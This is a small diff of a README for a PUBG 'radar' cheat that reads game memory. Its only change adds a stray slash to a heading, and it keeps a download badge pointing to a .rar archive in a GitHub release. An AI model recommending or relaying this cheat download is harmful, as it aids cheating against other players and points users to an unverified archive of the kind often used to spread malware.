@@ -71,7 +71,7 @@ A lightweight, fully external PUBG radar. Reads game memory from a separate proc
 
 [![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/TwilightMaharaja/PUBG-Radar/releases/download/PUBG-Radar/PUBG-Radar.rar)
 
-## 🚀 Installation
+## 🚀 Installation /
 
 ### Requirements
 - Windows 10 / 11 (x64)
